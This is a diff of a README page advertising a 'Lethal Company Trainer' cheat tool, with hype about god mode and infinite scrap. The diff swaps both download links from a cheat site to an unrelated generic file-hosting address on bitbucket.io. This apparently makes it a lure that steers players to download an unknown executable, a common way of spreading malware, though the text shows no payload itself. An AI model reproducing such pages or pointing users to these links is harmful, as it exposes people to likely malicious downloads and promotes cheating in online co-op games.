@@ -4,7 +4,7 @@
 
 If you're deep into **Lethal Company** and fed up with low scrap hauls, monster jumpscares, or slow teammates dragging you down, the **Lethal Company Trainer** is your one-way ticket to easy wins. Designed for speed, simplicity, and domination, this trainer drops all the essentials in one sleek package.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://wecheaters.github.io/cheats/lethal-company/)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload15.bitbucket.io)
 ---
 
 ## 🎮 What Is a Lethal Company Trainer?
@@ -13,7 +13,7 @@ A **trainer** is like a cheat panel on steroids. It's a lightweight external app
 
 Perfect for solo players, chill co-op sessions, or testing out game mechanics without all the grind.
 
-[![Download Trainer](https://i.ytimg.com/vi/B5RZNBVvWWU/maxresdefault.jpg)](https://wecheaters.github.io/cheats/lethal-company/)
+[![Download Trainer](https://i.ytimg.com/vi/B5RZNBVvWWU/maxresdefault.jpg)](https://fileoffload15.bitbucket.io)
 ---
 
 ## 🧩 Key Features in This Trainer
@@ -106,3 +106,4 @@ Lethal Company trainer, Lethal Company cheat tool, infinite scrap cheat, god mod
 ---
 
 Want a stealth mode version or something more troll-friendly? Just hit me up 👻
+
